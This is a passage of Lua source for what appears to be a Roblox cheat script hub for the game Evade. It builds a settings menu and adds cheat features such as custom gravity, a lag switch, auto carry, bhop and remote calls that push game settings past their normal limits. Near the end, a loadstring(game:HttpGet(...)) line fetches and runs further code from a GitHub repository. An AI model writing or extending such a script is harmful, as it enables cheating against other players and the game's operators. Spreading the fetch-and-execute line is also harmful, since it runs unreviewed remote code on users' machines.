            WindUI:Notify({
                Title = "Error",
                Content = "Please enter a config name",
                Duration = 3
            })
            return
        end
        
        Window.CurrentConfig = ConfigManager:Config(CurrentConfigName)
        
        local success = Window.CurrentConfig:Save()
        if success then
            WindUI:Notify({
                Title = "Config Saved",
                Content = "Config '" .. CurrentConfigName .. "' saved successfully",
                Duration = 3
            })
            
            if AutoLoadEnabled then
                AutoLoadConfig = CurrentConfigName
                saveAutoLoadSettings()
            end
            
            task.wait(0.5)
            refreshConfigList()
        else
            WindUI:Notify({
                Title = "Error",
                Content = "Failed to save config",
                Duration = 3
            })
        end
    end
})

Tabs.Settings:Space()

local LoadConfigButton = Tabs.Settings:Button({
    Title = "Load Config",
    Desc = "Load settings from selected config",
    Icon = "folder-open",
    Callback = function()
        if CurrentConfigName == "" then
            WindUI:Notify({
                Title = "Error",
                Content = "Please enter a config name",
                Duration = 3
            })
            return
        end
        
        Window.CurrentConfig = ConfigManager:CreateConfig(CurrentConfigName)
        
        local success = Window.CurrentConfig:Load()
        if success then
            WindUI:Notify({
                Title = "Config Loaded",
                Content = "Config '" .. CurrentConfigName .. "' loaded successfully",
                Duration = 3
            })
            
            if AutoLoadEnabled then
                AutoLoadConfig = CurrentConfigName
                saveAutoLoadSettings()
            end
        else
            WindUI:Notify({
                Title = "Error",
                Content = "Config '" .. CurrentConfigName .. "' not found or empty",
                Duration = 3
            })
        end
    end
})

Tabs.Settings:Space()

local DeleteConfigButton = Tabs.Settings:Button({
    Title = "Delete Config",
    Desc = "Delete selected config",
    Icon = "trash-2",
    Color = Color3.fromHex("#ff4830"),
    Callback = function()
        if CurrentConfigName == "default" then
            WindUI:Notify({
                Title = "Error",
                Content = "Cannot delete default config",
                Duration = 3
            })
            return
        end
        
        local success = ConfigManager:DeleteConfig(CurrentConfigName)
        if success then
            WindUI:Notify({
                Title = "Config Deleted",
                Content = "Config '" .. CurrentConfigName .. "' deleted",
                Duration = 3
            })
            
            CurrentConfigName = "default"
            ConfigNameInput:Set("default")
            
            if AutoLoadEnabled then
                AutoLoadConfig = "default"
                saveAutoLoadSettings()
            end
            
            task.wait(0.5)
            refreshConfigList()
        else
            WindUI:Notify({
                Title = "Error",
                Content = "Failed to delete config or config doesn't exist",
                Duration = 3
            })
        end
    end
})

Tabs.Settings:Space()

local RefreshConfigButton = Tabs.Settings:Button({
    Title = "Refresh Config List",
    Desc = "Update the list of available configs",
    Icon = "refresh-cw",
    Callback = function()
        refreshConfigList()
        WindUI:Notify({
            Title = "Config List Refreshed",
            Content = "Config list updated",
            Duration = 2
        })
    end
})

task.spawn(function()
    task.wait(0.5) 
    refreshConfigList()
    
    ConfigNameInput:Set("default")
    
    if AutoLoadEnabled then
        CurrentConfigName = AutoLoadConfig
        ConfigNameInput:Set(CurrentConfigName)
        
        task.wait(1)
        Window.CurrentConfig = ConfigManager:Config(CurrentConfigName)
        
        if Window.CurrentConfig:Load() then
            WindUI:Notify({
                Title = "Auto-Loaded",
                Content = "Config '" .. CurrentConfigName .. "' loaded automatically",
                Duration = 3
            })
        end
    end
end)

if AutoSaveEnabled then
    task.spawn(function()
        task.wait(1)
        
        if AutoSaveEnabled then
            AutoSaveConnection = game:GetService("RunService").Heartbeat:Connect(function()
                if AutoSaveEnabled and CurrentConfigName ~= "" then
                    task.spawn(function()
                        Window.CurrentConfig = ConfigManager:Config(CurrentConfigName)
                        Window.CurrentConfig:Save()
                    end)
                end
                task.wait(1)
            end)
        end
    end)
end
    Tabs.Settings:Section({ Title = "Personalize", TextSize = 20 })
    Tabs.Settings:Divider()

    local themes = {}
    for themeName, _ in pairs(WindUI:GetThemes()) do
        table.insert(themes, themeName)
    end
    table.sort(themes)

    local canChangeTheme = true
    local canChangeDropdown = true

    ThemeDropdown = Tabs.Settings:Dropdown({
        Title = "Select Theme",
        Flag = "ThemeDropdown",
        Values = themes,
        SearchBarEnabled = true,
        MenuWidth = 280,
        Value = "Dark",
        Callback = function(theme)
            if canChangeDropdown then
                canChangeTheme = false
                WindUI:SetTheme(theme)
                canChangeTheme = true
            end
        end
    })

    local TransparencySlider = Tabs.Settings:Slider({
        Title = "Window Transparency",
        Flag = "TransparencySlider",
        Value = { Min = 0, Max = 1, Default = 0.2, Step = 0.1 },
        Callback = function(value)
            WindUI.TransparencyValue = tonumber(value)
            Window:ToggleTransparency(tonumber(value) > 0)
        end
    })

    ThemeToggle = Tabs.Settings:Toggle({
        Title = "Enable Dark Mode",
        Flag = "ThemeToggle",
        Desc = "Use dark color scheme",
        Value = true,
        Callback = function(state)
            if canChangeTheme then
                local newTheme = state and "Dark" or "Light"
                WindUI:SetTheme(newTheme)
                if canChangeDropdown then
                    ThemeDropdown:Select(newTheme)
                end
            end
        end
    })

    WindUI:OnThemeChange(function(theme)
        canChangeTheme = false
        ThemeToggle:Set(theme == "Dark")
        canChangeTheme = true
    end)

    Tabs.Settings:Section({ Title = "Keybinds" })
        Tabs.Settings:Keybind({
        Flag = "Keybind",
        Title = "Keybind",
        Desc = "Keybind to open ui",
        Value = "RightControl",
        Callback = function(RightControl)
            Window:SetToggleKey(Enum.KeyCode[RightControl])
        end
    })
Tabs.Settings:Keybind({ Flag = "StartRecord", Title = "Start Recording", Value = "", Callback = StartRecord })
Tabs.Settings:Keybind({ Flag = "StopRecord",  Title = "Stop Recording",  Value = "", Callback = StopRecord })
Tabs.Settings:Keybind({ Flag = "PlayTAS",     Title = "Play TAS",        Value = "", Callback = PlayTAS })
Tabs.Settings:Section({ Title = "Game Settings (In Beta)", TextSize = 35 })
Tabs.Settings:Section({ Title = "Note: This is a permanent Changes, it's can be used to pass limit value", TextSize = 15 })
Tabs.Settings:Divider()
Tabs.Settings:Section({ Title = "Visual", TextSize = 20 })
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ChangeSettingRemote = ReplicatedStorage:WaitForChild("Events"):WaitForChild("Data"):WaitForChild("ChangeSetting")
local UpdatedEvent = game:GetService("ReplicatedStorage").Modules.Client.Settings.Updated

local UpdatedEvent = game:GetService("ReplicatedStorage").Modules.Client.Settings.Updated
local ChangeSettingRemote = game:GetService("ReplicatedStorage").Events.Data.ChangeSetting

MapShadowToggle = Tabs.Settings:Toggle({
    Title = "Map Shadow",
    Callback = function(state)
        ChangeSettingRemote:InvokeServer(6, state)
        UpdatedEvent:Fire(6, state)
    end
})

LowGraphicToggle = Tabs.Settings:Toggle({
    Title = "Low graphic",
    Callback = function(state)
        ChangeSettingRemote:InvokeServer(5, state)
        UpdatedEvent:Fire(5, state)
    end
})
RagdollToggle = Tabs.Settings:Toggle({
    Title = "Ragdoll",
    Callback = function(state)
        ChangeSettingRemote:InvokeServer(10, state)
        UpdatedEvent:Fire(10, state)
    end
})
MusicVolumeInput = Tabs.Settings:Input({
    Title = "Music volume",
    Placeholder = "0.5",
    NumbersOnly = true,
    Callback = function(value)
        local num = tonumber(value)
        if num then
            ChangeSettingRemote:InvokeServer(7, num)
            UpdatedEvent:Fire(7, num)
        end
    end
})
NextbotVolumeInput = Tabs.Settings:Input({
    Title = "Nextbot volume",
    Placeholder = "100",
    NumbersOnly = true,
    Callback = function(value)
        local num = tonumber(value)
        if num then
            ChangeSettingRemote:InvokeServer(9, num)
            UpdatedEvent:Fire(9, num)
        end
    end
})

BoomBoxVolumeInput = Tabs.Settings:Input({
    Title = "Boom box volume",
    Placeholder = "100",
    NumbersOnly = true,
    Callback = function(value)
        local num = tonumber(value)
        if num then
            ChangeSettingRemote:InvokeServer(4, num)
            UpdatedEvent:Fire(4, num)
        end
    end
})

EmoteVolumeInput = Tabs.Settings:Input({
    Title = "Emote volume",
    Placeholder = "100",
    NumbersOnly = true,
    Callback = function(value)
        local num = tonumber(value)
        if num then
            ChangeSettingRemote:InvokeServer(8, num)
            UpdatedEvent:Fire(8, num)
        end
    end
})

NextbotVignetteToggle = Tabs.Settings:Toggle({
    Title = "Nextbot vignette",
    Callback = function(state)
        ChangeSettingRemote:InvokeServer(12, state)
        UpdatedEvent:Fire(12, state)
    end
})

R15EnabledToggle = Tabs.Settings:Toggle({
    Title = "R15 enabled",
    Callback = function(state)
        ChangeSettingRemote:InvokeServer(15, state)
        UpdatedEvent:Fire(15, state)
    end
})

AnimatedTagToggle = Tabs.Settings:Toggle({
    Title = "Animated tag",
    Callback = function(state)
        ChangeSettingRemote:InvokeServer(18, state)
        UpdatedEvent:Fire(18, state)
    end
})
Tabs.Settings:Section({ Title = "Game", TextSize = 20 })
CanBeCarriedToggle = Tabs.Settings:Toggle({
    Title = "Can be carried",
    Callback = function(state)
        ChangeSettingRemote:InvokeServer(1, state)
        UpdatedEvent:Fire(1, state)
    end
})

FovInput = Tabs.Settings:Input({
    Title = "Fov",
    Placeholder = "100",
    NumbersOnly = true,
    Callback = function(value)
        local num = tonumber(value)
        if num then
            ChangeSettingRemote:InvokeServer(2, num)
            UpdatedEvent:Fire(2, num)
        end
    end
})

PovScrollToggle = Tabs.Settings:Toggle({
    Title = "Pov scroll",
    Callback = function(state)
        ChangeSettingRemote:InvokeServer(13, state)
        UpdatedEvent:Fire(13, state)
    end
})

SprintViewmodelToggle = Tabs.Settings:Toggle({
    Title = "Sprint viewmodel",
    Callback = function(state)
        ChangeSettingRemote:InvokeServer(11, state)
        UpdatedEvent:Fire(11, state)
    end
})

ViewbobToggle = Tabs.Settings:Toggle({
    Title = "Viewbob",
    Callback = function(state)
        ChangeSettingRemote:InvokeServer(3, state)
        UpdatedEvent:Fire(3, state)
    end
})

VoicchatVolumeInput = Tabs.Settings:Input({
    Title = "Voicchat volume",
    Placeholder = "100",
    NumbersOnly = true,
    Callback = function(value)
        local num = tonumber(value)
        if num then
            ChangeSettingRemote:InvokeServer(14, num)
            UpdatedEvent:Fire(14, num)
        end
    end
})
Tabs.Settings:Section({ Title = "GUI Size Settings", TextSize = 20 })
Tabs.Settings:Divider()

local function scaleGui(guiName, value)
    local gui = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild(guiName)
    if not gui then
        gui = Instance.new("ScreenGui")
        gui.Name = guiName
        gui.Parent = game:GetService("Players").LocalPlayer.PlayerGui
    end
    
    local uiScale = gui:FindFirstChildOfClass("UIScale")
    if not uiScale then
        uiScale = Instance.new("UIScale")
        uiScale.Parent = gui
    end
    uiScale.Scale = value / 100
end

Tabs.Settings:Slider({
    Title = "BhopGui Size",
    Flag = "BhopGuiSize",
    Desc = "Adjust BhopGui interface size (100 = normal size)",
    Value = { Min = 10, Max = 1000, Default = 100, Step = 10 },
    Callback = function(value)
        scaleGui("BhopGui", value)
    end
})

Tabs.Settings:Slider({
    Title = "Auto Carry Gui Size",
    Flag = "AutoCarryGuiSize",
    Desc = "Adjust Auto Carry Gui interface size (100 = normal size)",
    Value = { Min = 10, Max = 1000, Default = 100, Step = 10 },
    Callback = function(value)
        scaleGui("AutoCarryGui", value)
    end
})

Tabs.Settings:Slider({
    Title = "CrouchGui Size",
    Flag = "AutoCrouchGuiSize",
    Desc = "Adjust CrouchGui interface size (100 = normal size)",
    Value = { Min = 10, Max = 1000, Default = 100, Step = 10 },
    Callback = function(value)
        scaleGui("CrouchGui", value)
    end
})

Tabs.Settings:Slider({
    Title = "Easy Trimp Gui Size",
    Flag = "EasyTrimmpGuiSize",
    Desc = "Adjust EmoteGui interface size (100 = normal size)",
    Value = { Min = 10, Max = 1000, Default = 100, Step = 10 },
    Callback = function(value)
        scaleGui("EasyTrimpGui", value)
    end
})

Tabs.Settings:Slider({
    Title = "EmoteGui Size",
    Flag = "EmoteGuiSize",
    Desc = "Adjust EmoteGui interface size (100 = normal size)",
    Value = { Min = 10, Max = 1000, Default = 100, Step = 10 },
    Callback = function(value)
        scaleGui("EmoteGui", value)
    end
})

Tabs.Settings:Slider({
    Title = "GravityGui Size",
    Flag = "GravityGuiSize",
    Desc = "Adjust GravityGui interface size (100 = normal size)",
    Value = { Min = 10, Max = 1000, Default = 100, Step = 10 },
    Callback = function(value)
        scaleGui("GravityGui", value)
    end
})

Tabs.Settings:Slider({
    Title = "LagSwitchGui Size",
    Flag = "LagswitchGuiSize",
    Desc = "Adjust LagSwitchGui interface size (100 = normal size)",
    Value = { Min = 10, Max = 1000, Default = 100, Step = 10 },
    Callback = function(value)
        scaleGui("LagSwitchGui", value)
    end
})
Tabs.Settings:Section({ Title = "UI Visiblety", TextSize = 20 })
Tabs.Settings:Divider()

TopGuiButtonDropdown = Tabs.Settings:Dropdown({
    Title = "Top UI Visiblety",
    Flag = "TopGuiButtonDropdown",
    Desc = "Show/hide buttons in CustomTopGui",
    Values = {"SecondaryButton", "ReloadButton", "LeaderboardButton"},
    Multi = true,
    AllowNone = true,
    Value = {"SecondaryButton", "ReloadButton", "LeaderboardButton"},
    Callback = function(values)
        playerGui = player.PlayerGui
        customTopGui = playerGui:FindFirstChild("CustomTopGui")
        if not customTopGui then return end
        frame = customTopGui:FindFirstChild("Frame")
        if not frame then return end
        rightFrame = frame:FindFirstChild("Right")
        if not rightFrame then return end
        
        buttonNames = {"SecondaryButton", "ReloadButton", "LeaderboardButton"}
        
        for _, buttonName in ipairs(buttonNames) do
            frame = rightFrame:FindFirstChild(buttonName)
            if frame then
                frameVisible = false
                for _, selectedName in ipairs(values) do
                    if selectedName == buttonName then
                        frameVisible = true
                        break
                    end
                end
                frame.Visible = frameVisible
            end
        end
    end
})
FPSCounterToggle = Tabs.Settings:Toggle({
    Title = "Show FPS Counter",
    Flag = "FPSCounterToggle",
    Value = true,
    Callback = function(state)
        FPSCounter = game:GetService("CoreGui"):FindFirstChild("FPSCounter")
        if FPSCounter and FPSCounter:IsA("ScreenGui") then
            FPSCounter.Enabled = state
        end
    end
})

task.wait(0.5)
FPSCounter = game:GetService("CoreGui"):FindFirstChild("FPSCounter")
if FPSCounter and FPSCounter:IsA("ScreenGui") then
    FPSCounterToggle:Set(FPSCounter.Enabled)
end
do
     InviteCode = "ny6pJgnR6c"
     DiscordAPI = "https://discord.com/api/v10/invites/" .. InviteCode .. "?with_counts=true&with_expiration=true"

     success = pcall(function()
        Response = game:GetService("HttpService"):JSONDecode(request({
            Url = DiscordAPI,
            Method = "GET"
        }).Body)
        return Response
    end)
    
    if success and Response and Response.guild then
        Tabs.info:Section({
            Title = "Join My Discord Server",
            TextSize = 20,
        })
         DiscordServerParagraph = Tabs.info:Paragraph({
            Title = tostring(Response.guild.name),
    Flag = "DiscordServerParagraph",
            Desc = tostring(Response.guild.description),
            Image = "https://cdn.discordapp.com/icons/" .. Response.guild.id .. "/" .. Response.guild.icon .. ".png?size=1024",
            -- Thumbnail = "https://cdn.discordapp.com/banners/1300692552005189632/35981388401406a4b7dffd6f447a64c4.png?size=512",
            ImageSize = 48,
            Buttons = {
                {
                    Title = "Copy link",
                    Icon = "link",
                    Callback = function()
                        setclipboard("https://discord.gg/" .. InviteCode)
                    end
                }
            }
        })
    end
end
    Window:SelectTab(1)
end



setupGui()
setupMobileJumpButton()

Window:OnClose(function()
    isWindowOpen = false
	print ("Press " .. getCleanKeyName(currentKey) .. " To Reopen")
    if ConfigManager and configFile then
        configFile:Set("playerData", MyPlayerData)
        configFile:Set("lastSave", os.date("%Y-%m-%d %H:%M:%S"))
        configFile:Save()
    end
    if not game:GetService("UserInputService").TouchEnabled then
        pcall(function()
            WindUI:Notify({
                Title = "GUI Closed",
                Content = "Press " .. getCleanKeyName(currentKey) .. " To Reopen",
                Duration = 3
            })
        end)
    end
end)
Window:OnDestroy(function()
    print("Window destroyed")
    if keyConnection then
        keyConnection:Disconnect()
    end
    if keyInputConnection then
        keyInputConnection:Disconnect()
    end
    saveKeybind()
end)

Window:OnOpen(function()
    print("Window opened")
    isWindowOpen = true
end)

Window:UnlockAll()



task.spawn(function()
    while true do
        task.wait(0.5)
        local currentlyPresent = isPlayerModelPresent()
        
        if currentlyPresent and not playerModelPresent then
            playerModelPresent = true
            applyStoredSettings()
        elseif not currentlyPresent and playerModelPresent then
            playerModelPresent = false
        end
    end
end)

game:GetService("UserInputService").WindowFocused:Connect(function()
    saveKeybind()
end)


do
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

local uiToggledViaUI = false 
local isMobile = UserInputService.TouchEnabled 
local function makeDraggable(frame)
    local dragging, dragInput, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input == dragInput then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end
local function createToggleGui(name, varName, yOffset)
    local gui = playerGui:FindFirstChild(name.."Gui")
    if gui then gui:Destroy() end
    gui = Instance.new("ScreenGui", playerGui)
    gui.Name = name.."Gui"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.Enabled = isMobile

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 60, 0, 60)
    frame.Position = UDim2.new(0.5, -30, 0.12 + yOffset, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.35
    frame.BorderSizePixel = 0
    makeDraggable(frame)

    local corner = Instance.new("UICorner", frame)
    corner.CornerRadius = UDim.new(0, 6)

    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(150, 150, 150)
    stroke.Thickness = 2

    local label = Instance.new("TextLabel", frame)
    label.Text = name
    label.Size = UDim2.new(0.9, 0, 0.4, 0)
    label.Position = UDim2.new(0.05, 0, 0.05, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Roboto
    label.TextSize = 20 
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center

    local toggleBtn = Instance.new("TextButton", frame)
    toggleBtn.Name = "ToggleButton"
    toggleBtn.Text = getgenv()[varName] and "On" or "Off"
    toggleBtn.Size = UDim2.new(0.9, 0, 0.55, 0)
    toggleBtn.Position = UDim2.new(0.05, 0, 0.4, 0)
    toggleBtn.BackgroundColor3 = getgenv()[varName] and Color3.fromRGB(0, 100, 0) or Color3.fromRGB(0, 0, 0)
    toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255) 
    toggleBtn.Font = Enum.Font.Roboto
    toggleBtn.TextSize = 20 
    toggleBtn.TextXAlignment = Enum.TextXAlignment.Center
    toggleBtn.TextYAlignment = Enum.TextYAlignment.Center

    local buttonCorner = Instance.new("UICorner", toggleBtn)
    buttonCorner.CornerRadius = UDim.new(0, 4) 

    toggleBtn.MouseButton1Click:Connect(function()
        getgenv()[varName] = not getgenv()[varName]
        uiToggledViaUI = true
        toggleBtn.Text = getgenv()[varName] and "On" or "Off"
        toggleBtn.BackgroundColor3 = getgenv()[varName] and Color3.fromRGB(0, 100, 0) or Color3.fromRGB(0, 0, 0)
        gui.Enabled = true
    end)

    return gui, toggleBtn
end

local jumpGui, jumpToggleBtn
local MainTab = {}
MainTab.Toggle = function(self, config)
    config.Title = config.Title or "Toggle"
    config.Callback = config.Callback or function() end
    config.Value = config.Value or false

    local toggle = {
        Set = function(self, value)
            config.Value = value
            config.Callback(value)
        end
    }
    config.Callback(config.Value)
    return toggle
end

MainTab.Dropdown = function(self, config)
    config.Title = config.Title or "Dropdown"
    config.Values = config.Values or {}
    config.Multi = config.Multi or false
    config.Default = config.Default or (config.Multi and {} or config.Values[1])
    config.Callback = config.Callback or function() end

    local dropdown = {
        Select = function(self, value)
            config.Callback(value)
        end
    }
    config.Callback(config.Default)
    return dropdown
end

MainTab.Input = function(self, config)
    config.Title = config.Title or "Input"
    config.Placeholder = config.Placeholder or ""
    config.Value = config.Value or ""
    config.Callback = config.Callback or function() end

    local input = {
        Set = function(self, value)
            config.Callback(value)
        end
    }
    return input
end
end
if not featureStates then
    featureStates = {
        CustomGravity = false,
        GravityValue = workspace.Gravity
    }
end
local originalGameGravity = workspace.Gravity
local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui", 5)

local function makeDraggable(frame)
    frame.Active = true
    frame.Draggable = true
    
    local dragDetector = Instance.new("UIDragDetector")
    dragDetector.Parent = frame
    
    local originalBackground = frame.BackgroundColor3
    local originalTransparency = frame.BackgroundTransparency
    
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            frame.BackgroundTransparency = originalTransparency - 0.1
        end
    end)
    
    frame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            frame.BackgroundTransparency = originalTransparency
        end
    end)
end

local function createGravityGui(yOffset)
    local gravityGuiOld = playerGui:FindFirstChild("GravityGui")
    if gravityGuiOld then gravityGuiOld:Destroy() end
    
    local gravityGui = Instance.new("ScreenGui")
    gravityGui.Name = "GravityGui"
    gravityGui.IgnoreGuiInset = true
    gravityGui.ResetOnSpawn = false
    gravityGui.Enabled = getgenv().gravityGuiVisible
    gravityGui.Parent = playerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 60, 0, 60)
    frame.Position = UDim2.new(0.5, -30, 0.12 + (yOffset or 0), 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.35
    frame.BorderSizePixel = 0
    frame.Parent = gravityGui
    makeDraggable(frame)

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = frame

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(150, 150, 150)
    stroke.Thickness = 2
    stroke.Parent = frame

    local label = Instance.new("TextLabel")
    label.Text = "Gravity"
    label.Size = UDim2.new(0.9, 0, 0.5, 0)
    label.Position = UDim2.new(0.05, 0, 0, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Roboto
    label.TextSize = 16
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.TextScaled = true
    label.Parent = frame

    local gravityGuiButton = Instance.new("TextButton")
    gravityGuiButton.Name = "ToggleButton"
    gravityGuiButton.Text = featureStates.CustomGravity and "On" or "Off"
    gravityGuiButton.Size = UDim2.new(0.9, 0, 0.5, 0)
    gravityGuiButton.Position = UDim2.new(0.05, 0, 0.5, 0)
    gravityGuiButton.BackgroundColor3 = featureStates.CustomGravity and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
    gravityGuiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    gravityGuiButton.Font = Enum.Font.Roboto
    gravityGuiButton.TextSize = 14
    gravityGuiButton.TextXAlignment = Enum.TextXAlignment.Center
    gravityGuiButton.TextYAlignment = Enum.TextYAlignment.Center
    gravityGuiButton.TextScaled = true
    gravityGuiButton.Parent = frame

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 4)
    buttonCorner.Parent = gravityGuiButton

    gravityGuiButton.MouseButton1Click:Connect(function()
        featureStates.CustomGravity = not featureStates.CustomGravity
        if featureStates.CustomGravity then
            workspace.Gravity = featureStates.GravityValue
        else
            workspace.Gravity = originalGameGravity
        end
        gravityGuiButton.Text = featureStates.CustomGravity and "On" or "Off"
        gravityGuiButton.BackgroundColor3 = featureStates.CustomGravity and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
    end)
end

createGravityGui()

game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.J and getgenv().gravityGuiVisible then
        featureStates.CustomGravity = not featureStates.CustomGravity
        if featureStates.CustomGravity then
            workspace.Gravity = featureStates.GravityValue
        else
            workspace.Gravity = originalGameGravity
        end
        local gravityGui = playerGui:FindFirstChild("GravityGui")
        if gravityGui then
            local button = gravityGui.Frame:FindFirstChild("ToggleButton")
            if button then
                button.Text = featureStates.CustomGravity and "On" or "Off"
                button.BackgroundColor3 = featureStates.CustomGravity and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
            end
        end
        WindUI:Notify({
            Title = "Gravity",
            Content = "Custom Gravity " .. (featureStates.CustomGravity and "enabled" or "disabled"),
            Duration = 2
        })
    end
end)

if featureStates.CustomGravity then
    workspace.Gravity = featureStates.GravityValue
else
    workspace.Gravity = originalGameGravity
end
local downedConnection = nil

local function setupDownedListener(character)
    if downedConnection then
        downedConnection:Disconnect()
        downedConnection = nil
    end
    
    if character then
        downedConnection = character:GetAttributeChangedSignal("Downed"):Connect(function()
            if character:GetAttribute("Downed") == true then
                deactivateFreecam()
            end
        end)
        
        if character:GetAttribute("Downed") == true then
            deactivateFreecam()
        end
    end
end

player.CharacterAdded:Connect(function(character)
    setupDownedListener(character)
end)

if player.Character then
    setupDownedListener(player.Character)
end

--[[the part of loadstring prevent error]]
loadstring(game:HttpGet('https://raw.githubusercontent.com/Pnsdgsa/Script-kids/refs/heads/main/Scripthub/Darahub/evade/More-Loadstrings.lua'))()
local function monitorAnyDamage()
    local function setupCharacter(character)
        local humanoid = character:WaitForChild("Humanoid")
        local lastHealth = humanoid.Health
        local isAlive = true
        
        local function checkAliveStatus()
            if character:GetAttribute("Downed") then
                return false
            end
            
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid and humanoid.Health > 0 then
                return true
            end
            
            return false
        end
        
        humanoid.HealthChanged:Connect(function(currentHealth)
            local wasAlive = isAlive
            isAlive = checkAliveStatus()
            
            if featureStates.ResetWhenTakeDamage and isAlive and currentHealth < lastHealth then
                if featureStates.ResetDamageType == "Any Damage" then
                    game:GetService("ReplicatedStorage").Events.Character.ToolAction:FireServer(-2)
                    
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://8164951181"
                    sound.Volume = 3
                    sound.Parent = game:GetService("SoundService")
                    sound:Play()
                    
                    sound.Ended:Connect(function()
                        sound:Destroy()
                    end)
                elseif featureStates.ResetDamageType == "Low Health" and currentHealth <= 25 then
                    game:GetService("ReplicatedStorage").Events.Character.ToolAction:FireServer(-2)
                    
                    local sound = Instance.new("Sound")
                    sound.SoundId = "rbxassetid://8164951181"
                    sound.Volume = 3
                    sound.Parent = game:GetService("SoundService")
                    sound:Play()
                    
                    sound.Ended:Connect(function()
                        sound:Destroy()
                    end)
                end
            end
            
            lastHealth = currentHealth
        end)
        
        character:GetAttributeChangedSignal("Downed"):Connect(function()
            isAlive = not character:GetAttribute("Downed")
        end)
        
        isAlive = checkAliveStatus()
    end
    
    if player.Character then
        setupCharacter(player.Character)
    end
    player.CharacterAdded:Connect(setupCharacter)
end

monitorAnyDamage()
